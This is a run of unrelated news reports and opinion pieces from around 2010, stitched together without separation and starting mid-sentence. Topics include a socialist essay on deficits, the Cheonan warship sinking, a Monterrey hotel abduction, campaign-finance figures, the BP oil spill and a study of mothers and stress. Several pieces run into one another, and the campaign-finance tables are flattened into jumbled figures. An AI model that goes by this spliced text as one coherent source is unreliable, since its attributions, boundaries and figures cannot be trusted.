Had it been given to green businesses , ethical investors and so on , it could have created a new , gentler capitalist economy .
The socialist perspective is different .
Crisis is inherent in capitalism , because the system has to expand or die .
It 's not because governments interfere , do n't interfere enough or interfere in the wrong ways .
The problem lies in how production takes place in a capitalist society .
Every time a capitalist makes money , other capitalists rush into the same business to make money too .
The technological changes associated with this process increase the amount of machinery involved -- which lowers the amount of actual work , the source of value , going into production .
Profits fall , and capitalists look to save money to stay afloat - - both by attacking workers ' wages directly , replacing more workers with machines ( which only makes the problem worse ) and finding cheaper workers elsewhere .
Finally , capitalists also pressure governments to reduce the " social wage " : social programs , unemployment benefits and all the other things that allow workers to hold out for longer , before being forced to work for less .
The institutions repackaging debts into derivatives make this process worse : at every stage of new debts being created , the expectations of profits become higher .
Meanwhile the actual prospects for profits become lower .
Something has to burst .
Government stimulus can postpone that bubble , or make its explosion smaller .
And indeed it has -- hence larger deficits .
These deficits are a result of capitalism 's crisis .
What role do financial speculators play ?
SPECULATORS ACTUALLY provide an essential service to capital , by advancing credit necessary to create new businesses before those businesses have a chance to turn a profit .
When speculators buy public bonds , which governments sell to raise funds to cover deficits , the speculators are shifting the burden of having to make a profit to governments .
Speculators try to get returns on investments that are higher than what bonds pay now .
In effect , speculators tell governments " You have to create the conditions for profitability , by encouraging a ' friendly business environment . ' "
In a recession , that means lowering taxes on businesses , raising taxes on workers , weakening regulations that protect jobs , social services and the environment -- and making sure the police and courts are ready to deal with any unrest this austerity provokes .
People opposed to the evils of financial speculation should demand new , democratic public financial institutions that invest in ways that are geared to meeting human needs , not to exceeding average profits .
Their problems and ours
DEFICITS ARE real .
The crisis of state finances is genuine , because capitalist states have to do certain things to maintain capitalist rule : providing infrastructure , legal regulations , a police force that can control the population , military forces and so on .
States also provide education , health care and other services that working people use .
If the state stopped financing everything tomorrow , the result would be social collapse , not a utopia .
So finding a way to finance some state activities is essential .
However , this does not mean that deficits are our problem .
We should not accept the priorities of capitalist governments !
If we demand that our governments refuse to make payments on their debts , it means telling governments to stop managing the affairs of capital and to stop meeting the profit expectations of speculators .
Naturally enough , capitalist governments will almost always refuse to do this .
So fighting austerity inflicted on us in the name of deficit reduction poses the question : should public authorities serve the needs of capital or the vast majority ?
It 's all about priorities .
A great deal of what states spend is , from the perspective of the working class , useless - just think of the military and ' national security ' budget , interest payments to bond - holders and the many subsidies and bailouts to corporations .
By fighting against austerity , we 're also fighting for what we really do need .
Our problem is what capitalist governments do to try to deal with their problems .
Layoffs and cuts to social programs and government services are the problem we should take seriously .
Our response to what governments and other public sector employers are doing in the name of cutting deficits and restraining costs should be inspired by how many workers in Greece have responded to the package of layoffs , cuts and tax increases that the social democratic Greek government has brought in : general strikes by public and private sector workers , marches , rallies and occupations of buildings .
Such a movement should not only oppose deficit reduction measures that hurt ordinary people .
It should demand that the government repudiate the debt , impose controls on capital flows and nationalize the financial system , converting banks and other financial institutions into democratically - run public institutions ( cutting out speculators in the process ) .
It is utterly irrational for people to suffer harm in the name of reducing deficits .
This is one of the ways in which capitalism is irrational -- just like famine in a world that produces more than enough food to feed everyone and the refusal of governments to take drastic action to reduce the carbon emissions that are causing the climate change crisis even though low - carbon transportation , heating and power - generating technologies exist .
Like famine and climate change , the demand that people sacrifice for the sake of deficit reduction is a good reason for people to reject capitalism and fight for a democratic reorganization of society geared to the needs of people , not profit .

Divers are continuing to search the wreckage of the ship South Korea 's defence minister has renewed speculation a torpedo could have caused the blast that sank a warship off its coast last week .
Kim Tae - young said it was a " likely possibility " the Cheonan had been hit by such a missile , but that all possibilities needed to be considered .
Mr Kim did not say who would have fired a torpedo or under what circumstances it could have happened .
Rescuers are still searching for 46 sailors missing on board the ship .
Officials say some could be trapped alive in watertight sections of the vessel .
" We 'd like to think our sailors were well - trained enough to survive days underwater , " said Cdr Song Moo-jin of South Korea 's naval salvage unit .
Mr Kim had previously said a sea mine could have caused the blast , which tore the 1,200 - tonne corvette in half near Baengnyeong Island , close to the maritime border with North Korea .
But on Friday , he told parliament a torpedo was " a more realistic cause than a mine " .
Mr Kim said sailors who had escaped the ship had not reported detecting any incoming missiles before the blast , the Yonhap news agency reported .
Earlier in the week , South Korea 's President Lee Myung - bak said there had to be " no suspicion or negligence " in the investigation .
Shortly after the sinking , Seoul said it did not believe Pyongyang had fired on the ship .
There were initial reports another South Korean ship had fired shots toward an unidentified vessel after the blast , but officials later speculated the target had been a flock of birds .
Officials have said establishing a definitive cause could have to wait until the ship is salvaged .
The search for the missing sailors continued on Friday , after poor weather disrupted operations on previous days .
Yonhap said 169 military divers were searching the area throughout the day although conditions were still difficult .
Oxygen has been piped into the vessel , but divers have detected no signs of life .
Pyongyang has made no official comment on the incident .
It does not accept the maritime border , known as the Northern Limit Line , which was drawn unilaterally by the US - led United Nations Command at the end of the Korean War .
The sea border has been the scene of deadly clashes between the navies of the two Koreas in the past .

Armed men have stormed two hotels in the northern Mexican city of Monterrey , abducting four guests and as many as three hotel employees , officials say .
Nuevo Leon 's state attorney general said up to 30 gunmen had raided the Holiday Inn and Hotel Mision .
The gunmen abducted three businessmen , a female guest and two receptionists .
A hotel security guard is also missing .
The raid follows a surge of violence that has plagued Monterrey , Mexico 's industrial capital , in recent weeks .
Alejandro Garza y Garza , the state attorney general , said organised crime was probably behind the attacks .
" A lot of what we 're going through right now is part of a readjustment among cartels , " Mr Garza y Garza told a news conference .
' Targeted attack '
The attackers appeared to be searching for specific guests when they entered the Holiday Inn hotel in the early hours , the attorney general said .
A handcuffed man led the attackers to room 517 on the fifth floor of the 17 - floor hotel , where an Asian guest was staying .
Realising he was not the man they were looking for , the gunmen continued with their hunt , Mr Garza y Garza said .
Those abducted include three businessmen from Mexico City and a woman from Reynosa , a Mexican city on the US - Mexico border .
Mr Garza y Gaza said a private security guard outside the Holiday Inn had clashed with the gunmen .
The guard had been reported missing and it was not known if he had been taken by the men , he said .
The attackers also stole a computer that contained security videos and the Holiday Inn 's guest registry , Mr Garza y Garza said .
According to local media reports , the attackers blocked two main avenues leading to the hotel with several hijacked trucks to prevent police from reaching the area .
Some analysts suggest initial evidence from the abduction points to the Zetas , a paramilitary group linked to drug trafficking in Monterrey , but the group 's exact affiliation remains unknown .
SEOUL ( Reuters ) - South Korea said after a rare emergency security meeting on Friday it would respond prudently to the sinking of one of its naval ships by the North , but Pyongyang warned the peninsula was being driven to war .
U.S. Secretary of State Hillary Clinton strongly condemned North Korea ’s action and called for an international response .
The South announced on Thursday that it had overwhelming evidence a North Korean submarine had entered its waters in March and attacked the Cheonan corvette , killing 46 sailors in what President Lee Myung - bak called a “ military provocation . ”
North Korea denied the accusation and said it was ready to tear up all agreements with the South , with whom it remains technically at war under a truce that ended fighting in the 1950 - 53 Korean War .
“ It was a military provocation and violation of the U.N. Charter and the truce agreement , ” Lee , whose two years in office have seen relations with the North turn increasingly frosty , said in a statement .
“ Since this case is very serious and has a grave importance , we cannot afford to have a slightest mistake and will be very prudent in all response measures we take , ” his office quoted him as telling a rare emergency National Security Council meeting .
Lee is expected to announce his response early next week .
CLEAR MESSAGE , INTERNATIONAL RESPONSE
Clinton , speaking in Tokyo after talks with Japan ’s foreign minister , said there must be a clear message to North Korea that provocative actions have consequences .
“ We cannot allow this attack on South Korea to go unanswered by the international community , ” Clinton said after talks with Japanese Foreign Minister Katsuya Okada .
Clinton did not say what international action she wanted to see .
Steps could range from fresh U.N. Security Council sanctions on North Korea , although those might be opposed by China , to a statement of condemnation by the world body .
South Korean Defense Minister Kim Tae - young said Seoul would work with the international community to come up with non-military sanctions against the reclusive state .
In the past , both sides had put a limit on their hostility .
“ North Korea has surpassed these limits .
For those acts , the government will definitely make sure North Korea pays , ” Kim said .
Yonhap news agency reported South Korea and the United States were considering raising the alert status on North Korea as tensions build .
A senior U.S. official with Clinton told reporters the United States has already increased the vigilance of its military forces in the region .
“ PHASE OF WAR ”

North Korea was typically defiant .
“ From this time on , we will regard the situation as a phase of war and will be responding resolutely to all problems in North - South relations , ” the North ’s Committee for the Peaceful Reunification of the Fatherland said in a statement .
“ If the South puppet group comes out with ‘ response ’ and ‘ retaliation ’ , we will respond strongly with ruthless punishment including the total shutdown of North - South ties , abrogation of the North - South agreement on non-aggression and abolition of all North - South cooperation projects . ”
Seoul has repeatedly said it would not strike back at the North , aware that would frighten away investors already jittery about the escalating tension on the divided peninsula .

Apart from international sanctions , there is little else it can do .
Economic relations have come to a near standstill since Lee became president , apart from a joint factory park just inside impoverished North Korea which now has to rely almost entirely on China , its only major ally .
Yonhap News cited government sources saying Seoul may shut down sea routes that allow North Korean vessels sail through South Korean waters near its southern end and save costs .
North Korea has often threatened to attack Seoul but most analysts say that , in the face of a much better equipped South Korean army backed by some 28,000 U.S. troops on the peninsula , any major confrontation would be suicidal for Pyongyang .
Some analysts still warned the more the North ’s now frail leader Kim Jong - il is pushed into a corner , the greater the risk of clashes .
Kim is also trying to secure the succession for one of his sons .
China has so far maintained its support of the North and said it would make its own assessment of the investigation into the sinking of the Cheonan .
U.S. officials said they were confident South Korea would seek measured actions and that they saw no signs that North Korea , known for its bellicose rhetoric , was bracing for war .
“ The South Koreans do not wish to go to war and they will not take steps that run that risk , ” said a second U.S. official traveling with Clinton , who will meet top Chinese officials in Beijing on Monday and Tuesday , including President Hu Jintao .
U.S. officials made clear they would try to enlist China ’s help in deterring North Korea .
“ We ’d like to see them acknowledge the reality of what happened and then join with South Korea , Japan and us in helping to fashion a response that helps to change the North Korean behavior , ” said this official .
North Korea ’s foreign ministry accused Washington of using the Cheonan sinking “ to totally break off the Korean peninsula denuclearization process ” -- a reference to long - stalled talks to persuade Pyongyang to abandon its nuclear ambitions .
Los Angeles city prosecutors are sending letters to 439 medical marijuana dispensaries warning them that they must shut down by June 7 , when an ordinance to control pot shops will finally take effect after years of debate and delay .
Frank Mateljan , spokesman for the city attorney ’s office , said the Police Department and city building inspectors compiled the list of illegal dispensaries .
“ We ’re not saying we have them all , ” he said .
“ This is the initial blanketing of locations that we are aware of at this time . ”
Under the ordinance , only those dispensaries that registered with the clerk in 2007 , when the City Council adopted a moratorium on any new stores , can remain open .
City officials estimate that between 130 and 140 of the original 186 registered dispensaries are still operating .
Hundreds of dispensaries opened in Los Angeles in the last couple of years as city officials failed to enforce the ban and the City Council struggled to write an ordinance to regulate them .
The letters , dated Tuesday , will be sent to both operators and the property owners .
They warn that violations of the ordinance are a misdemeanor and could lead to six months in jail and a $ 1,000 fine .
Any stores that stay open in violation of the ordinance could also face civil penalties of $ 2,500 a day .
A recent Pentagon report on the situation in Afghanistan over the past 6 months gives the impression that while things are n't necessarily getting any worse , they are far from improving .
Afghan citizens , when polled , showed only limited support for their government , and a slight majority placed the blame for instability on Taliban forces .
There remains a heavy reliance on international forces to provide security , training and equipment .
As of March 31st , there were approximately 133,500 foreign troops on the ground in Afghanistan - 87,000 U.S. forces and 46,500 international forces .
This month also saw the departure of a U.S. military presence from Afghanistan 's notorious Korengal Valley , a small , isolated , patch of difficult terrain where 42 soldiers lost their lives over the past five years .
NATO is calling the move a " realignment " , focusing efforts on more - populated areas .
Collected here are images of the country and conflict over the past month , part of an ongoing monthly series on Afghanistan .

Mysterious clouds of gas hovering above the plane of the Milky Way may be the fractured remnants of superbubbles blown by stellar winds and exploding stars .
" There 's a fundamental , interesting connection between gas far away from the Milky Way and the amount of star formation below it in the galactic plane , " F. Jay Lockman of the National Radio Astronomy Observatory told Wired Science in a phone interview .
The results could provide insight into how heavy elements traverse the galaxy and get incorporated into later generations of stars , planets and , perhaps , life .
The bulk of the matter in the Milky Way , including stars , hot star - forming regions and the gas and dust between stars called the interstellar medium , lies in a relatively flat disk called the galactic plane .
" It 's a flattened system , kind of like a pierogi , " Lockman said today at the American Astronomical Society in Miami .
The Milky Way also has a gaseous halo that extends above and below the galactic pastry .
For years , astronomers expected the density of that gas to get thinner as it got farther from the Milky Way , the way Earth 's atmosphere thins out at high altitudes .
But earlier observations Lockman made at the Green Bank Telescope in West Virginia showed dense clouds hundreds of times more massive than the sun floating between the disk and the halo , hundreds to thousands of light - years above the galactic plane .
" This turned my whole conception of what was going on upside down , " he said .
" It 's very much like seeing , all your life , a distant hillside that 's covered in green fuzz .
Then one day you get a pair of binoculars and you look and say , ' My God , there 's trees ! ' "
To investigate these clouds further , Lockman and colleagues used data from the Parkes Observatory radio telescope in Australia of two regions of the Milky Way , one on either side of the galactic center from Earth 's point of view .
Individual clouds in both regions looked about the same , Lockman said – on average they were 600 times the mass of the sun and spanned 30 to 40 light - years .
But the region on the " northern " side , to the left of the galactic center , had three times as many clouds as the " southern " region .
" I thought we would see a difference between north and south , but I thought it would be pretty subtle , " Lockman said .
" It 's not subtle at all . "
It turned out the northern region included part of the bar of the Milky Way .
A new survey of hydrogen gas in the galaxy that was presented at the same meeting confirmed this region is an active stellar nursery .
" At the end of the galactic bar emanating from the galactic center , there is a huge complex of star forming regions , " said Tom Bania of Boston University .
The southern region , by contrast , fell between two spiral arms , " not particularly associated with anything at all , " Lockman said .
Lockman and his colleagues concluded that the gas clouds were blown away from the galactic plane by stellar winds from these intense star - forming regions .
When the more massive of these stars die , they explode as supernovas , blowing enormous bubbles of gas " like supersonic lava lamps , " Lockman said .
These bubbles pop like soap after they rise , leaving behind the mysterious clouds .
" There are still lots of questions , " Lockman said .
" But I think we 've finally solved the question of their origin . "
These clouds could also be responsible for transporting heavy elements around the galaxy .
All elements heavier than hydrogen and helium are built in nuclear reactions inside stars , and are blown off into the interstellar medium when stars explode as supernovas .
That material later condenses into new , metal - rich stars – and ultimately planets .
" When our galaxy formed , planets like the Earth could not form , " Bania said .
" Put the Earth in a blender and you 've got silicon , magnesium , the stuff that 's formed in supernovas . "
If the clouds are in fact the remnants of supernova bubbles , Lockman said , then " it 's quite possible that these clouds as they fall back to the Milky Way are the way that metals get mixed in through the disk , and this controls the overall evolution of the interstellar medium and the next generation of stars . "

I have no idea if this is true but : Surprise !:
“ A big mystery seller of futures contracts during the market meltdown last week was not a hedge fund or a high frequency trader as many have suspected , but money manager Waddell & Reed Financial Inc , according to a document obtained by Reuters .
Waddell sold on May 6 a large order of e-mini contracts during a 20 - minute span in which U.S. equity markets plunged , briefly wiping out nearly $ 1 trillion in market capital , the internal document from CME Group Inc said .
Regulators and exchange officials quickly focused on Waddell ’s sale of 75,000 e-mini contracts , which the document said “ superficially appeared to be anomalous activity . ”
The CME document shows that during the sell - off and subsequent rally , other active traders in e-minis included Jump Trading , Goldman Sachs , Interactive Brokers , JPMorgan Chase and Citadel Group .
During the 20 - minute period , 842,514 contracts in e-minis were traded while Waddell from 2 p.m. to 3 p.m. traded its contracts , CME said .
The CME document did not provide a break - out of Waddell ’s trading during the crucial 20 minutes .
Reps .
Dennis Kucinich ( D - Ohio ) and Joe Wilson ( R - S.C. ) do n’t agree on health care reform .
They do n’t agree on energy legislation , nor do they agree on immigration .
Politically , they may not agree on much at all .
However , they do share one distinction .
Both have received nearly two - thirds of their campaign contributions from donors who contribute $ 200 or less , the Federal Election Commission ’s threshold for itemized disclosure .
By comparison , the average House member only received 7 percent of their contributions from such “ small donors . ”
Kucinich has long been a darling of liberals , a leading voice against U.S. wars in Afghanistan and Iraq and a strong proponent of single - payer health care .
He has raised $ 460,000 this cycle , with around $ 310,000 coming from small donors .
Wilson gained notoriety when he shouted “ You lie ” during President Barack Obama ’s health care address to Congress last September .
The incident earned him a formal rebuke from the House , but also made him a hero of sorts among the conservative grass roots — which massively boosted his fund - raising .
So far this cycle , Wilson has raised an impressive $ 3.7 million , nearly $ 2.5 million of which came from donors giving $ 200 or less .
“ There are a lot of people who are not necessarily wealthy , but want to support him and what he ’s doing , so they are willing to donate to his campaign , ” Dustin Olson , Wilson ’s campaign manager , told OpenSecrets Blog .
“ We would like to have as many people be a part of this campaign as possible . ”
Only eight House members have received more than 35 percent of contributions from small donors .
Of this group , six are Republicans .
Name Total

Indivs % Large
Indivs Rep. Joe Wilson ( R - S.C. ) $ 3,731,325 9 % 91 % 67 % 24 % Rep. Dennis Kucinich ( D - Ohio ) $ 463,578 9 % 89 % 67 % 22 % Rep. Alan Grayson ( D - Fla . ) $ 3,179,284 15 % 83 % 62 % 21 % Rep. Trent Franks ( R - Ariz . ) $ 490,889 17 % 83 % 49 % 34 % Rep. Thomas McClintock ( R - Calif . ) $ 1,243,276 8 % 92 % 45 % 46 % Rep. Michele Bachmann ( R - Minn . ) $ 2,348,048 10 % 90 % 43 % 46 % Rep. Joseph Cao ( R - La . ) $ 1,260,396 18 % 81 % 40 % 41 % Rep. Paul Broun ( R - Ga . ) $ 1,227,124 13 % 86 % 38 % 47 %
One of these Republicans is Rep. Joseph Cao ( R - La . ) .
Cao represents a heavily Democratic district and is widely considered the most vulnerable House Republican .
He has raised nearly $ 1.3 million this campaign cycle , with 40 percent coming from small donors .
Contributions from political action committees account for only 18 percent of his campaign cash .
Cao ’s office says the congressman ’s small - donor support is no coincidence .
“ His was a grassroots campaign , and so it ’s not surprising that a large share of contributions would come from smaller contributors , ” said Taylor Henry , Cao ’s communications director .
“ Congressman Cao is proud to be a representative of people , and I think the campaign finance records would reflect that he is just that . ”
The other Democrat on the list , Rep. Alan Grayson ( D - Fla. ) , gained heightened media attention during the health care debate with his controversial floor speeches , which gained a second - life on the Internet where they have often been used as a fund - raising tool .
Small donors , in turn , rewarded Grayson , who has received 62 percent of his nearly $ 3.2 million war chest from small donors this campaign cycle .
“ This is what ‘ People Power ’ looks like , ” Grayson said in a statement e-mailed to OpenSecrets Blog .
“ We are succeeding because people are sick and tired of seeing Members of Congress for sale .
“ When people with a conscience can actually out - raise the lobbyists and the special interests , that ’s amazing , ” he continued .
“ When ordinary people can put someone at the top who cares only about them , that ’s extraordinary .
And that ’s the real change we need — government of the people , by the people and for the people . ”
Messages left with Kucinich ’s office seeking comment on this story were not returned .
Candidate websites , fund - raising emails , YouTube and social networking sites like Facebook and Twitter have all enhanced politicians ability to raise funds from small donors .
Wilson ’s campaign has also conducted live online chats , responding directly to supporters ’ questions and asking them for support , according to Olson .
The average House Republican received more from small donors — 9 percent — than their average Democratic counterpart , who collected only 6 percent from small donors .
The average House Republican also received more from large donors , 45 percent , compared to the 42 percent from individuals who give more than $ 200 to the average House Democrat .
% PAC % Indivs % Small Indivs % Large Indivs Average House Dem 49 % 48 % 6 % 42 % Median House Dem 49 % 49 % 4 % 42 % Average House GOP 41 % 55 % 9 % 45 % Median House GOP 43 % 54 % 7 % 44 % Average House Overall 46 % 51 % 7 % 44 % Median House Overall 46 % 50 % 5 % 43 %
Only a few members of Congress have raked in big money from small contributions ; others have been far more reliant on PAC money .
For instance , Rep. Pete Stark ( D - Calif. ) has received nearly 89 percent of his campaign contributions from PACs — almost twice the House average .
PACs have contributed around $ 270,000 to Stark this campaign cycle , with the majority of contributions — $ 175,000 — coming from the health sector .
Stark is the chairman of the Health Subcommittee of the Ways and Means Committee .
Labor PACs have contributed an additional $ 30,000 to his campaign .
The average House member received 46 percent of contributions from PACs , with the average Democrat taking in more PAC money than the average Republicans — 49 percent compared to 41 percent .
PAC money tends to favor the party in power .
Of the ten members who received the largest share of their money from PACs — all getting more than 75 percent of their cash from PACs — nine are Democrats .
Name Total Raised % PAC % Indivs % Small
Indivs % Large
Indivs Rep. Pete Stark ( D - Calif . ) $ 304,088.50 89 % 10 % 4 % 6 % Rep. Laura Richardson ( D - Calif . ) $ 243,558.99 87 % 13 % 2 % 10 % Rep. Melvin Watt ( D - N.C. ) $ 234,855.02 85 % 15 % 2 % 12 % Rep. James Matheson ( D - Utah ) $ 1,000,967.99 83 % 15 % 2 % 13 % Rep. David Camp ( R - Mich . ) $ 1,370,195.06 82 % 16 % 3 % 14 % Rep.

Another California Democrat on this list , Rep. Laura Richardson , has received 87 percent of her cash from PACs — a total of $ 212,000 in contributions .
Rep. Jim Matheson ( D - Utah ) , a Blue Dog Democrat who represents a heavily Republican district and who earlier this month failed to secure enough support from party activists to avoid a primary , has raised more than $ 1 million so far , with nearly 83 percent coming from PACs .
His largest contributors have been the health sector , with $ 222,000 in contributions , and the energy and natural resources sector , with $ 100,000 in contributions .
In a statement e-mailed to OpenSecrets Blog Rep.
Matheson said : “ I am proud that people choose to make campaign contributions to my campaign from across the political spectrum .
There is zero connection between the source of the contributions that I receive and how I vote .
I make each decision based on what I believe to be the merits of the issue .
I run every campaign based on my approach to this job and on my record .
This primary election will be no different . ”
The only Republican to make the top ten list of PAC recipients is Rep. Dave Camp ( R - Mich . ) .
Camp — the ranking member of the influential Ways and Means Committee — has raised nearly $ 1.4 million , with 82 percent coming from PACs .
Camp has received over $ 200,000 each from the health and finance , insurance and real estate sectors .
Messages left with the offices of Stark , Richardson and Camp were not returned .

The Oil Spill Disaster … And a System NOT Fit to Be the Planet 's Caretakers
Editors ' Note :
The following article draws on a May 4 talk given by Raymond Lotta on the Gulf of Mexico environmental disaster , at Revolution Books in New York City ; audio of the talk is available for download at revolutionbooksnyc.org .
A massive oil spill is taking place in the Gulf of Mexico — a devastating disaster that threatens to become an unparalleled environmental catastrophe .
The April 20 explosion on the Deepwater Horizon drilling platform , operated by British Petroleum ( BP ) , killed 11 workers and unleashed an underwater volcano of gushing oil from one mile below the water 's surface .
Estimates are that 210,000 gallons of oil are spewing out every day ; the area covered by the spill stretches 240 miles east to west and 100 miles north to south .
And the spill continues to spread .
The spill endangers fragile salt marshlands , fresh - water ponds , creeks , lakes , and other wetlands around the Gulf region , which contains up to 40 % of total U.S. wetlands .
The Louisiana Department of Wildlife and Fisheries estimates at least 400 species — from shrimp to pelicans to river otters and many others — could be impacted by the oil , including a dozen considered endangered .
Oil has already hit offshore islands .
But the danger is not only to ecosystems on shore .
Oil spills can be devastating to species living in the sea , and there are interactions between marine and shore life in the life cycles of many species .
Around this time of the year , the eggs and larvae of dozens of species of fish and shellfish spend their earliest days floating on the water surface , where the oil from the spill sits .
The oil is also lethal to adult turtles , dolphins , and fish .
Already , more than 30 loggerhead sea turtles have washed onto beaches , their flesh oozing blood .
A biologist told the New York Times , " The iconic images of oiled seabirds are just the tip of the iceberg , because oil spills affect life up and down the food chain . "
And the poisonous effects of the oil are long - lasting .
A British marine biologist pointed out some frightening facts : " That part of the gulf 's coastline consists of a sedimentary shore with lots of muddy inlets .
The oil will penetrate into the mud , and because it contains no oxygen the oil will not biodegrade .
For generations , any disturbance of the sediment will bring oil back to the surface and that will happen over a very large area . "
BP moved to supposedly limit the flow of oil by placing a " containment dome " over the gushing well — but so far they have failed in that attempt .
According to many estimates , it could take as long as six months to actually stanch the leak .
Not an Accident
This environmental disaster was not an " unavoidable accident . "
It certainly was n't an " act of god . "
Oil well blowouts like this are not uncommon .
But BP has refused to spend money and effort on safety and environmental measures and equipment .
BP has been packaging itself as a " green " company , even branding itself as " Beyond Petroleum . "
But this " green " corporation , along with other major oil corporations , was able to block regulations requiring installation of a device called an " acoustic switch " that triggers an underwater valve to shut down a well in case of a blowout — finding the $ 500,000 cost of the device too high .
But what is the cost — to all life in this whole region and beyond , including humans — of what the BP spill is doing to ecosystems on a vast scale ?
BP tried to initially downplay the seriousness of the current spill — until it could no longer hide the fact that oil was gushing out at five times the rate BP was claiming .
This corporation has been involved in a series of environmental disasters , including repeated spills in Alaska from corroded oil pipes .
BP has been fined millions of dollars for violations of the Water Pollution Control Act .
And in the year before this current spill , BP aggressively cut back to save $ 4 billion in operating costs .
As outrageous and immoral as all this is , BP is n't a criminal acting alone — it has had the open backing of the government .
The Obama administration approved BP 's bid to drill in the Gulf in February 2009 , despite BP 's record .
The U.S. Interior Department 's Minerals Management Service ( MMS ) used a loophole in the law to exempt BP from environmental restrictions .
In fact , according to the Center for Biological Diversity , " MMS exempts hundreds of dangerous offshore oil drilling projects in the Gulf of Mexico every year . "
BP 's plan and environmental impact statement for the Deepwater Horizon drilling project claimed it was " unlikely that an accidental surface or subsurface oil spill would occur from the proposed activities . "
BP said any spill would likely not cause much damage because the oil platform was too far from shore and that " response capabilities " would be adequate — so " no significant adverse impacts are expected . "
All this is now exposed as bald - faced lies .
Just a month ago Obama lifted a decades - long moratorium on offshore drilling and proposed massively expanding offshore U.S. drilling into new areas in Alaska , the eastern Gulf of Mexico and the Atlantic coast from Maryland to Florida .
Obama himself offered this assurance : " Oil rigs today generally do n't cause spills . "
Obama and his administration are now saying BP is responsible and will be made to pay for the cost of the spill , and that they are rethinking the ending of the offshore drilling moratorium .
This is nothing but cover - your - ass hypocrisy .
What dollar amount can be put on the incredible harm being done to all kinds of animal and plant life — including those in peril of dying out forever — through this oil spill ?
In a May 7 press release , the Center for Biological Diversity exposed how the MMS approved 27 new offshore drilling projects since the first day of the BP spill — " 26 under the same environmental review exemption used to approve the disastrous BP drilling that is fouling the Gulf and its wildlife . "
Two of those approvals for drilling operations were awarded to BP .
The truth is this monstrous environmental disaster had very definite causes in the short - sighted , profit - driven activity of a capitalist corporation — and official U.S. government policy which encouraged and enabled such activity .
Something Deeper at Work
But what is actually behind the drive to expand the drilling for oil in places like the Gulf ?
To get at the deeper reality , we have to come to grips with the fact that there is much more to this oil spill than the greed of a giant oil company ( or even the whole oil industry ) and the policies — as outrageous as they are — of any one government .
What we 're seeing here are the workings of an economic and political system : the system of capitalism - imperialism .
Obama and other world " leaders " are not , and cannot be , caretakers of the planet — because they are caretakers of a system that is , by its very nature , behind the environmental emergency confronting humanity .
The current energy system of extracting oil , coal , and gas ( known as fossil fuels ) is tremendously profitable .
This is why this system based on fossil fuels is the dominant form of energy used in the world , despite the fact that it is tremendously destructive to the environment and now fueling potentially catastrophic global climate change .
Fossil fuel and automobile transport are deeply embedded in the structures of capitalist production and expansion .
Of the 10 largest companies in the world in 2007 , six were oil companies and three were car companies .
The U.S. is an imperialist power that dominates , exploits , and oppresses whole nations and peoples worldwide — and oil is integral to the maintenance , defense , and extension of this empire .
The U.S. military is the single largest institutional purchaser of oil in the world .
Because capitalist development and expansion rely on this highly profitable — and environmentally hazardous — source of energy , the more accessible and conventional sites are becoming depleted .
The system 's response to the end of " easy oil " has been to tap more unconventional sources , through deep offshore oil and gas drilling around the world .
Natural gas and coal companies are also pursuing a strategy of maximum extraction — by drilling through shale rock or removing mountaintops .
Mega -companies are jousting over who will be the first to lay claim to these new sources , to strike deals with host countries , and to find the means to extract this energy .
And it 's not just a matter of individual companies .
There are huge geopolitical factors involved .
The major capitalist powers — the U.S. , European Union countries , China , Russia , Japan , and others — are all vying with each other for strategic control over regions where new fossil fuel sources are to be found .
Not that long ago , the Gulf of Mexico was thought to have been " played out " as a major source of oil , mainly because the fields known to exist were considered unreachable .
But the rush to drill has been enabled by new technological developments .
In the mid 1980s there were several dozen active oil rigs in the Gulf — by 2006 there were 3,858 .
The result has been the aquatic ( and mineral rights ) equivalent of a land grab in the Gulf — a process going on elsewhere as well — as various companies stake their claims to different fields recently discovered or recently opened up because of the technological " advances . "
The following is from an April 30 , 2010 , NY Times article on the current spill , revealingly titled " The Spill vs. A Need to Drill " :
There is another reason why offshore drilling is likely to continue .
Most of the new discoveries lie beneath the world 's oceans , including the Gulf of Mexico .
For the oil companies , these reserves are worth hundreds of billions of dollars and represent the industry 's future .
Since the 1980s , the Gulf has turned into a vast laboratory for the industry to test and showcase its most sophisticated technology .
This is where oil companies found ways to drill in ever - deeper water , where they developed bigger platforms to pump even more oil , where they pioneered the use of unmanned submarines and elaborate underwater systems straight out of a science fiction novel .
What 's totally missing from this picture is any concern about environmental hazards and impacts .
And that is not science fiction but a brute reality of how the capitalist system operates .
Things Do Not Have to Be This Way
In a concentrated way , the Gulf oil spill is an expression of how this planet 's environment and human destiny itself are being driven to the brink of disaster .
This is happening at a time when there exists wealth on a vast scale and technology on a level never before imagined … wealth and technology that is in the hands of the capitalist - imperialist system .
People are rightly outraged by the criminal actions of the oil company and the government in the Gulf .
But the reality is that disasters like this , and the environmental crisis as a whole , cannot be addressed within the framework of this system .
This is a hard truth — but one people must come face - to - face with .
There is , however , another truth .
Things do n't have to be this way .
Under a radically different system , the tremendous wealth and technology that exist could and should be a resource shared by all of humanity and used to meet the needs of people everywhere for decent and fulfilling lives and to safeguard the planet we live on .
We encourage readers to get into the articles " Communism and Ecology : How Revolution Opens the Way for Humanity to Confront the Environmental Crisis and Become Caretakers of the Planet " and " Some Key Principles of Socialist Sustainable Development , " which are part of the recent special issue of Revolution newspaper on the environment .
We are building , right now , a movement for all - the - way emancipatory revolution that includes taking up major social battles such as around the environment — while projecting and popularizing our vision of a whole new world .
And the campaign now , " The Revolution We Need … the Leadership We Have , " is aimed at making a big leap in this revolutionary movement .
Everyone who is concerned and outraged about the state of the existing world should find out about this and find ways to relate to and become part of this campaign and movement in various creative ways .

Mother ’s
Day has already come and gone this year , but according to new research , your stress levels may decrease if you keep in touch with your Mom .
Seth D. Pollack , PhD , led a team of researchers from the University of Wisconsin - Madison who looked at the effect that contact with mothers can have on the stress levels of their daughters .
Previous studies using animal models showed that oxytocin levels increased when the animals had direct physical contact with their mothers .
Oxytocin is the “ feel good ” chemical released in the brain that can counter the stress hormone cortisol .
In this current study published in Proceedings of the Royal Society B , Pollack et al. found that verbal contact with moms can have similar beneficial effects on oxytocin levels .
Researchers took 61 girls between the ages of 7 and 12 and had them do public speaking or public math solving , situations which normally increase stress levels .
They then divided the girls into three groups .
The first group had physical contact with their mothers for 15 minutes following the stressful event .
The second group talked to their mothers over the telephone for 15 minutes .
But the third group had no contact with their mothers .
Instead , they watched a 75 - minute neutral film , which the other two groups also watched as soon as they were done interacting with their mothers .
Cortisol and oxytocin levels were tested on the girls , both before and after the stressful event .
Girls who had contact ( either full or verbal ) with their mothers , had drops in their cortisol levels starting immediately after the stress test and returning to normal levels within 30 minutes .
The girls who had no contact with their mothers experienced continual rises in their cortisol levels that lasted throughout the experience .
